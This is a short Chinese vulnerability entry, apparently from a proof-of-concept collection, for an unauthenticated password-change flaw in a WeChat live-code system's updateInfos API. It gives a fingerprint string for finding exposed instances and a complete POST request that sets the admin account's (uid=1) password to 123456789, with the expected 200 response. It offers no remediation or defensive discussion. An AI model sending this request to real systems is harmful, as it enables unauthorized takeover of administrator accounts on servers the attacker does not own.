# 微信活码系统updateInfos前台未授权任意用户密码修改

- **系统**：微信活码系统updateInfos前台未授权任意用户密码修改　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`body=".qn-user-login"`
- **请求**：`POST /index.php?s=/api/user/updateInfos HTTP/1.1`

**请求体 / payload**
```
默认管理员用户名为admin且uid为1
Host: 192.168.18.137
Priority: u=0
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 38
uid=1&data[password]=123456789
```
- **预期**：200　|　—